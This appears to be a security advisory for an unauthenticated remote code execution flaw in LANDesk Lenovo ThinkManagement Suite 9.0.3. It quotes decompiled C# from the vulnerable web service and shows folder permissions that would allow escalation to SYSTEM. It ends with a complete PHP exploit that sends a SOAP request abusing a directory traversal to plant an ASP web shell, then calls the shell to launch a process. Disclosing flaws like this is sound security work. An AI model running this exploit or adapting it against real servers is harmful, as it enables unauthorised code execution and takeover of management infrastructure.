@@ -1,0 +1,465 @@
+LANDesk Lenovo ThinkManagement Suite 9.0.3 Core Server AMTConfig.Business.dll 
+RunAMTCommand Remote Code Execution Vulnerability
+
+Tested against: Microsoft Windows Server 2003 r2 sp2
+
+Software home page: http://www.landesk.com/lenovo/thinkmanagement-console.aspx
+
+Download url: http://www.landesk.com/downloads/lenovo/50.aspx
+
+Files tested: 
+ThinkManagement9.0.2.exe
+LD90-SP2-MCP_CONS-2011-0428.exe
+LD90-SP2-MCP_SD-2011-0428.exe
+ThinkManagementConsole9.0.3_b28.zip
+
+Instrunctions were to install 9.0.2, then apply two patches, finally to install 9.0.3
+
+Background:
+The mentioned product creates various virtual directories on IIS.
+Among them the 'core.anonymous' one inside the 'landesk' tree.
+Without prior authentication / authorization is possible to 
+invoke the 'ServerSetup.asmx' web service which exposes various
+functions inside the underlying dlls.
+
+Vulnerability:
+By specifying the 'RunAMTCommand' operation is possible to 
+create arbitrary files inside public virtual directories.
+This operation supports five arguments: when the 'Command'
+argument is set ex. to '-PutUpdateFileCore', 
+'Data2' and 'Data3' are used for file creation.
+The first one suffers of a directory traversal vulnerability.
+You are in control of the path, extension and content
+of the newly created file.
+Then you can execute arbitrary code by invoking this file.
+
+Vulnerable code:
+
+C:\Program Files\LANDesk\ManagementSuite\LANDesk\ManagementSuite\Core\core.anonymous\ServerSetup.asmx
+
+...
+<%@ WebService Language="c#" Codebehind="ServerSetup.asmx.cs" Class="ServerSetup.ServerSetup" %>
+...
+
+Now look RunAMTCommand() inside ServerSetup.dll :
+
+...
+[WebMethod]
+public int RunAMTCommand(string Command, string Data1, string Data2, string Data3, ref string ReturnString)
+{
+    return Convert.ToInt32(Business.RunAMTCommand(Command, Data1, Data2, Data3, ref ReturnString));
+}
+...
+ 
+Again, look RunAMTCommand() inside ServerSetup.Business.dll :
+
+...
+public static int RunAMTCommand(string Command, string Data1, string Data2, string Data3, ref string ReturnString)
+{
+    SSLog.Log("RunAMTCommand()", new object[0]);
+    SSResult sSFailure = SSResult.SSFailure;
+    try
+    {
+        int num = new DBAccessBusiness().AvProBusinessInterface(Command, Data1, Data2, Data3, ref ReturnString); //<-------------
+        if (num == 0)
+        {
+            sSFailure = SSResult.SSOK;
+        }
+        else
+        {
+            SSLog.Log("ConfigureAMT - RunAMTCommand returned " + num.ToString(), new object[0]);
+            sSFailure = SSResult.SSAMTConfigFailure;
+        }
+    }
+    catch (Exception exception)
+    {
+        SSLog.Log("ConfigureAMT exception: " + exception.Message, new object[0]);
+        sSFailure = SSResult.SSException;
+    }
+    SSLog.Log("ConfigureAMT returned " + Convert.ToInt32(sSFailure).ToString(), new object[0]);
+    return Convert.ToInt32(sSFailure);
+}
+...
+ 
+
+Finally AvProBusinessInterface() inside AMTConfig.Business.dll :
+
+
+public int AvProBusinessInterface(string Command, string Location, string Module, string Data, ref string ReturnString)
+{
+    int exitCode = -1;
+    try
+    {
+        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() Command: " + Command, new object[0]);
+        if (Command.Equals("-RunExe"))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Did run: " + Module, new object[0]);
+        }
+        if (Command.Equals("-RunClientNotify"))
+        {
+            Process process = new Process();
+            if (process != null)
+            {
+                process.StartInfo.FileName = Path.Combine(LDMainPath, "ClientNotify.exe");
+                process.StartInfo.Arguments = Data;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.CreateNoWindow = true;
+                if (process.Start())
+                {
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process.StartInfo.FileName, new object[0]);
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Arguments: " + process.StartInfo.Arguments, new object[0]);
+                    exitCode = 0;
+                    Thread.Sleep(0);
+                    process.Close();
+                }
+                else
+                {
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process.StartInfo.FileName, new object[0]);
+                }
+            }
+        }
+        if (Command.Equals("-RunGetAMTIDs"))
+        {
+            Process process2 = new Process();
+            if (process2 != null)
+            {
+                process2.StartInfo.FileName = Path.Combine(LDMainPath, "getamtid.exe");
+                process2.StartInfo.Arguments = Data;
+                process2.StartInfo.UseShellExecute = false;
+                process2.StartInfo.RedirectStandardOutput = true;
+                process2.StartInfo.CreateNoWindow = true;
+                process2.StartInfo.WorkingDirectory = LDMainPath;
+                if (process2.Start())
+                {
+                    ReturnString = process2.StandardOutput.ReadToEnd();
+                    process2.WaitForExit();
+                    process2.Close();
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process2.StartInfo.FileName, new object[0]);
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Arguments: " + process2.StartInfo.Arguments, new object[0]);
+                    exitCode = 0;
+                    Thread.Sleep(0);
+                }
+                else
+                {
+                    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Unsucessfully run: " + process2.StartInfo.FileName, new object[0]);
+                }
+            }
+        }
+        if (Command.Equals("-UpdateAgentPresenceXML"))
+        {
+            StreamWriter writer = new StreamWriter(Path.Combine(LDMainPath, "AgentPresence.xml"));
+            if (writer != null)
+            {
+                RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - UpdateAgentPresenceXML", new object[0]);
+                writer.Write(Data);
+                writer.Close();
+            }
+        }
+        if (Command.Equals("-PutUpdateFileCore"))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - PutUpdateFileCore", new object[0]);
+            StreamWriter writer2 = new StreamWriter(Path.Combine(LDMainPath, Module)); //<------------------------- !!!
+            if (writer2 != null)
+            {
+                writer2.Write(Data); //<------------------------- !!!
+                writer2.Close();
+                Process process3 = new Process();
+                if (process3 != null)
+                {
+                    process3.StartInfo.FileName = Path.Combine(LDMainPath, "AMTConfigExt.exe");
+                    process3.StartInfo.Arguments = "-cmd massmanage -importfile \"" + LDMainPath + Module + "\"";
+                    process3.StartInfo.UseShellExecute = false;
+                    process3.StartInfo.RedirectStandardOutput = true;
+                    process3.StartInfo.CreateNoWindow = true;
+                    process3.StartInfo.WorkingDirectory = LDMainPath;
+                    if (process3.Start())
+                    {
+                        ReturnString = process3.StandardOutput.ReadToEnd();
+                        process3.WaitForExit();
+                        process3.Close();
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process3.StartInfo.FileName, new object[0]);
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Arguments: " + process3.StartInfo.Arguments, new object[0]);
+                        exitCode = 0;
+                        Thread.Sleep(0);
+                    }
+                    else
+                    {
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Unsucessfully run: " + process3.StartInfo.FileName, new object[0]);
+                    }
+                }
+            }
+        }
+        if (Command.Equals("-ProvisionOnly"))
+        {
+            string str;
+            string str2;
+            string str3;
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - ProvisionOnly", new object[0]);
+            exitCode = this.ParseCSVData(Data, out str, out str2, out str3);
+            if (exitCode == 0)
+            {
+                exitCode = this.ProvisionAMT(str, str2, str3);
+                ReturnString = exitCode.ToString();
+            }
+        }
+        if (Command.Equals("-RunEnhancedRemediation"))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - RunEnhancedRemediation", new object[0]);
+            if (-1 != Module.IndexOf("CircuitBreakerConfig.exe", StringComparison.CurrentCultureIgnoreCase))
+            {
+                Process process4 = new Process();
+                if (process4 != null)
+                {
+                    process4.StartInfo.FileName = Path.Combine(LDMainPath, Module);
+                    process4.StartInfo.Arguments = Data;
+                    process4.StartInfo.UseShellExecute = false;
+                    process4.StartInfo.RedirectStandardOutput = true;
+                    process4.StartInfo.CreateNoWindow = true;
+                    process4.StartInfo.WorkingDirectory = LDMainPath;
+                    if (process4.Start())
+                    {
+                        ReturnString = process4.StandardOutput.ReadToEnd();
+                        process4.WaitForExit();
+                        exitCode = process4.ExitCode;
+                        process4.Close();
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process4.StartInfo.FileName, new object[0]);
+                        if (ReturnString.ToLower().IndexOf("err") >= 0)
+                        {
+                            exitCode = -1;
+                        }
+                        else if (exitCode == 1)
+                        {
+                            exitCode = 0;
+                        }
+                        Thread.Sleep(0);
+                    }
+                    else
+                    {
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Unsucessfully run: " + process4.StartInfo.FileName, new object[0]);
+                    }
+                }
+            }
+        }
+        if (Command.Equals("-RunMassCheckConfigurationForSingleMachine"))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - RunMassCheckConfigurationForSingleMachine", new object[0]);
+            exitCode = this.Create_masscheckforconfigchanges_ProcessForSingleMachine(Data);
+        }
+        if (Command.Equals("-RunMassCheckConfiguration"))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - RunMassCheckConfiguration", new object[0]);
+            exitCode = this.Create_masscheckforconfigchanges_Process();
+        }
+        if ((Command.Equals("-RunMassPowerOn") || Command.Equals("-RunMassPowerOff")) || ((Command.Equals("-RunMassReboot") || Command.Equals("-RunMassRebootOrPowerOn")) || Command.Equals("-RunMassUpdateInventory")))
+        {
+            RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - " + Command, new object[0]);
+            StreamWriter writer3 = new StreamWriter(Path.Combine(LDMainPath, Module));
+            if (writer3 != null)
+            {
+                writer3.Write(Data);
+                writer3.Close();
+                string str4 = string.Empty;
+                if (Command.Equals("-RunMassPowerOn"))
+                {
+                    str4 = "masspowerup";
+                }
+                else if (Command.Equals("-RunMassPowerOff"))
+                {
+                    str4 = "masspowerdown";
+                }
+                else if (Command.Equals("-RunMassReboot"))
+                {
+                    str4 = "massreboot";
+                }
+                else if (Command.Equals("-RunMassRebootOrPowerOn"))
+                {
+                    str4 = "massrebootPwrOn";
+                }
+                else if (Command.Equals("-RunMassUpdateInventory"))
+                {
+                    str4 = "massupdate";
+                }
+                Process process5 = new Process();
+                if (process5 != null)
+                {
+                    process5.StartInfo.FileName = Path.Combine(LDMainPath, "AMTConfigExt.exe");
+                    process5.StartInfo.Arguments = "-cmd " + str4 + " -importfile \"" + LDMainPath + Module + "\"";
+                    process5.StartInfo.UseShellExecute = false;
+                    process5.StartInfo.RedirectStandardOutput = true;
+                    process5.StartInfo.CreateNoWindow = true;
+                    process5.StartInfo.WorkingDirectory = LDMainPath;
+                    if (process5.Start())
+                    {
+                        ReturnString = process5.StandardOutput.ReadToEnd();
+                        process5.WaitForExit();
+                        process5.Close();
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Sucessfully run: " + process5.StartInfo.FileName, new object[0]);
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Arguments: " + process5.StartInfo.Arguments, new object[0]);
+                        exitCode = 0;
+                        Thread.Sleep(0);
+                    }
+                    else
+                    {
+                        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Unsucessfully run: " + process5.StartInfo.FileName, new object[0]);
+                    }
+                }
+            }
+        }
+    }
+    catch (Exception exception)
+    {
+        exitCode = -1;
+        RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - Exception: " + exception.Message, new object[0]);
+    }
+    RollingTempLog.Log("AMTConfig.Business.AvProBusinessInterface() - rc: " + exitCode.ToString(), new object[0]);
+    return exitCode;
+}
+
+
+*Various attacks* can be performed according to the command specified.
+
+I'm choosing -PutUpdateFileCore because it is easier to verify.
+
+
+As attachment, proof of concept code, written in php which executes arbitrary code
+with NETWORK SERVICE privilege.
+
+It could be possible also to execute arbitrary code with SYSTEM privileges
+because to the ManagementSuite folder were given unsecure permission, see, from the command line:
+
+C:\>cacls "C:\Program Files\LANDesk\ManagementSuite\" 
+C:\Program Files\LANDesk\ManagementSuite SERVER\LANDesk Management Suite:R 
+                                         SERVER\LANDesk Management Suite:(OI)(CI)(IO)(special access:)                                                                                      GENERIC_READ
+                                                                                     GENERIC_EXECUTE
+ 
+                                         SERVER\LANDesk Script Writers:R 
+                                         SERVER\LANDesk Script Writers:(OI)(CI)(IO)(special access:)                                                                                    GENERIC_READ
+                                                                                   GENERIC_EXECUTE
+ 
+                                         SERVER\LANDesk Administrators:(OI)(CI)F 
+                                         BUILTIN\Administrators:(OI)(CI)F 
+                                         NT AUTHORITY\SYSTEM:(OI)(CI)F 
+                                         NT AUTHORITY\NETWORK SERVICE:(OI)(CI)F 
+                                         SERVER\ASPNET:(OI)(CI)F  <--------------------------------- !!!
+                                         SERVER\IWAM_SERVER:R 
+                                         SERVER\IWAM_SERVER:(OI)(CI)(IO)(special access:)                                                                         GENERIC_READ
+                                                                        GENERIC_EXECUTE
+ 
+                                         SERVER\IUSR_SERVER:R 
+                                         SERVER\IUSR_SERVER:(OI)(CI)(IO)(special access:)                                                                         GENERIC_READ
+                                                                        GENERIC_EXECUTE
+ 
+                                         NT AUTHORITY\Authenticated Users:R 
+                                         NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(special access:)                                                                                       GENERIC_READ
+                                                                                      GENERIC_EXECUTE 
+
+
+ 
+Full privileges were given to the subfolders and files to the ASPNET user, so an attacker may
+replace binary and dlls. At the next computer startup the ThinkManagement services
+will load the malicious code. At the time of this report, a second exploit is in stage of development.
+
+
+POC:
+<?php
+/*
+LANDesk Lenovo ThinkManagement Suite 9.0.3 Core Server AMTConfig.Business.dll 
+RunAMTCommand Remote Code Execution Vulnerability
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_landesk.php [ip_address]\r\n" );
+       die();
+    }
+    
+	$argv[1] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: ".$ck ,
+            "Content-Type: text/xml; charset=utf-8",
+            "SOAPAction: \"http://tempuri.org/RunAMTCommand\""      
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 80;
+
+$shell="<%\r\n".
+       "Dim WshShell, oExec\r\n".
+       "Set WshShell = CreateObject(\"WScript.Shell\")\r\n".
+       "Set oExec = WshShell.Exec(\"calc\")\r\n".
+       "%>\r\n";
+
+$soap='<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <RunAMTCommand xmlns="http://tempuri.org/">
+      <Command>-PutUpdateFileCore</Command>
+      <Data1>aaaa</Data1>
+      <Data2>upl\suntzu.asp</Data2>
+      <Data3>'.htmlentities($shell).'</Data3>
+      <ReturnString>bbbb</ReturnString>
+    </RunAMTCommand>
+  </soap:Body>
+</soap:Envelope>';
+
+$url = "http://$host:$port/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx";
+$out = _s($url, 1, "", $soap);
+print($out."\n");
+
+sleep(2);
+
+$url = "http://$host:$port/upl/suntzu.asp";
+$out = _s($url, 0, "", "");
+print($out."\n");
+print("[*] Now look for calc.exe sub-process...");
+?>
+
